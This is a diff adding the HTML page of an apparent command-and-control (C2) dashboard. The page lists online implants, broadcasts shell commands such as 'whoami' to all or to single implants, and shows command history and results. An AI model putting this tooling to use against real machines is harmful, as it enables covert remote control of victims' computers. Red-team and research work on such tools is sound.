@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Dashboard</title>
+    <link rel="stylesheet" href="/static/dashboard.css">
+</head>
+<body>
+    <div class="container">
+        <h1 style="margin-bottom: 7px;">Welcome to dashboard</h1>
+        <!-- <h2>You can do all kinds of stuff here :)</h2> -->
+        <em>Dont mind the design lol, this is just a lightweight dashboard</em>
+    </div>
+
+    <hr>
+
+    <div class="container">
+        <h2>Online Implants</h2>
+        <p id="implant-count">0 Implants <span style="color: green;">online</span> right now</p>
+
+        <div id="implant-table" class="table" style="padding: 10px;"></div>
+    </div>
+
+    <div class="container">
+        <div id="payload-mode-title">
+            <h2>Broadcast command</h2>
+            <p><b>All implants</b> will get it, even those who join late</p>
+        </div>
+
+        <select name="payload-target" id="payload-target">
+            <option value="all">All</option>
+            <option value="singular">Singular</option>
+        </select>
+        <div id="implant-select"></div>
+        <br>
+        <textarea id="command-box" placeholder="whoami"></textarea> <br>
+        <button class="btn", id="send-command">Send payload</button>
+    </div>
+
+    <div class="container">
+        <h2>Command history</h2>
+        <p id="cmd-count">0 Commands in found history</p>
+
+        <div id="cmd-history-table" class="table"></div>
+    </div>
+
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <button id="close-modal">&times;</button>
+            <h3>Results for command #<span id="modal-cmd-id">0</span></h3>
+            <hr>
+            <br>
+            <div id="result"></div>
+        </div>
+    </div>
+    <script src="/static/dashboard.js"></script>
+</body>
+</html>
